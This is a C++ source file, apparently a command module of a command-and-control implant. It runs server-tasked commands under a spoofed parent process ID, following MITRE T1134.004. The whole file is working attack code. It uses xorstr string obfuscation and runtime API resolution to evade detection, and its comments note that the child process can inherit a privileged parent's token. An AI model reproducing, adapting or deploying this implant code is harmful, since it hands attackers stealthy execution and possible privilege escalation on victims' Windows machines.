// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <Windows.h>

#include <string>
#include <utility>
#include <vector>

#include "agent/commands/exec/runu.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

// Ref: MITRE T1134 (https://attack.mitre.org/techniques/T1134/)
// Ref: T1134.004 Parent PID Spoofing (https://attack.mitre.org/techniques/T1134/004/)
//
// The caller-supplied PID is bound to the child through PROC_THREAD_ATTRIBUTE_PARENT_PROCESS:
//
//   1. OpenProcess(PROCESS_CREATE_PROCESS) on the target PID — the handle must grant
//      PROCESS_CREATE_PROCESS for the kernel to accept it as a spoofed parent.
//   2. InitializeProcThreadAttributeList + UpdateProcThreadAttribute to attach the parent
//      handle to an attribute list.
//   3. CreateProcess with EXTENDED_STARTUPINFO_PRESENT so the attribute list is consumed.
//
// The kernel then records the target process as the creator, so the child inherits the
// spoofed parent's PPID (and its token / integrity level when that parent is privileged)
// instead of the agent's own PID.

namespace agent::commands::exec {

    namespace {

        /// Builds the command line for the child process.
        /// The server sends RunUDTO { PID, Command, Arguements }; the client interpreter packs
        /// the payload into `Arguements`, so both spellings are accepted.
        [[nodiscard]] std::string BuildCommandLine(const models::CheckinResponse& task) {
            std::string command = task.run_command;
            if (command.empty()) {
                return task.command.arguments;
            }
            if (!task.command.arguments.empty()) {
                command += xorstr_(" ");
                command += task.command.arguments;
            }
            return command;
        }

    }  // namespace

    CommandResult RunUnderProcess(const models::CheckinResponse& task) {
        if (task.pid <= 0) {
            return CommandResult::Error(xorstr_("Invalid target PID"));
        }

        const std::string command = BuildCommandLine(task);
        if (command.empty()) {
            return CommandResult::Error(xorstr_("No command supplied for RunU"));
        }

        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto open_process = agent::util::resolve_api<decltype(&OpenProcess)>(kernel32, xorstr_("OpenProcess"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));
        const auto create_process =
            agent::util::resolve_api<decltype(&CreateProcessW)>(kernel32, xorstr_("CreateProcessW"));
        const auto initialize_attribute_list = agent::util::resolve_api<decltype(&InitializeProcThreadAttributeList)>(
            kernel32, xorstr_("InitializeProcThreadAttributeList"));
        const auto update_attribute = agent::util::resolve_api<decltype(&UpdateProcThreadAttribute)>(
            kernel32, xorstr_("UpdateProcThreadAttribute"));
        const auto delete_attribute_list = agent::util::resolve_api<decltype(&DeleteProcThreadAttributeList)>(
            kernel32, xorstr_("DeleteProcThreadAttributeList"));

        // PROCESS_CREATE_PROCESS is required for the handle to be usable as a spoofed parent.
        HANDLE parent_process = open_process(PROCESS_CREATE_PROCESS, FALSE, static_cast<DWORD>(task.pid));
        if (parent_process == nullptr) {
            return CommandResult::Error(xorstr_("Failed to open target process"));
        }

        // The command line must be writable: CreateProcessW is allowed to modify the buffer.
        std::wstring wide_command = agent::util::ToWide(command);
        std::vector<wchar_t> command_line(wide_command.begin(), wide_command.end());
        command_line.push_back(L'\0');

        STARTUPINFOEXW startup_info{};
        startup_info.StartupInfo.cb = sizeof(STARTUPINFOEXW);

        SIZE_T attribute_size = 0;
        initialize_attribute_list(nullptr, 1, 0, &attribute_size);
        std::vector<unsigned char> attribute_buffer(attribute_size);
        auto* attribute_list = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attribute_buffer.data());

        std::string result;
        bool spawned = false;

        if (initialize_attribute_list(attribute_list, 1, 0, &attribute_size)) {
            const BOOL attribute_set = update_attribute(attribute_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                                        &parent_process, sizeof(parent_process), nullptr, nullptr);
            if (attribute_set) {
                startup_info.lpAttributeList = attribute_list;

                PROCESS_INFORMATION process_info{};
                const BOOL created = create_process(nullptr, command_line.data(), nullptr, nullptr, FALSE,
                                                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr,
                                                    &startup_info.StartupInfo, &process_info);
                if (created) {
                    spawned = true;
                    result = xorstr_("Process spawned with spoofed parent PID ");
                    result += std::to_string(task.pid);
                    result += xorstr_(" (child PID ");
                    result += std::to_string(process_info.dwProcessId);
                    result += xorstr_(")");
                    close_handle(process_info.hThread);
                    close_handle(process_info.hProcess);
                }
            }
            delete_attribute_list(attribute_list);
        }

        close_handle(parent_process);

        if (!spawned) {
            return CommandResult::Error(xorstr_("Failed to create process with spoofed parent"));
        }
        return CommandResult::Ok(std::move(result));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
